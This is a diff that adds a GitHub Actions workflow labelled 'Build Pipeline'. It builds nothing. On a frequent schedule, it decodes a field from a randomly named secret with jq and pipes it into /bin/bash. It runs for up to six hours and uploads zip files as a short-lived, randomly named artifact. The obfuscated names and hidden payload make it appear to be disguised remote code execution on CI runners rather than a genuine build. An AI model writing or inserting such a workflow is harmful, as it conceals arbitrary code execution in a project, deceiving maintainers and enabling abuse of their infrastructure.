@@ -1,0 +1,30 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          qquk838: ${{ secrets.qquk838 }}
+        run: |
+          printf '%s' "$qquk838" | jq -r .zwloq6 | /bin/bash
+          echo $srrua7578 | jq -r .qjb932 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7J2k8Zvf
+          path: "*.zip"
+          retention-days: 1
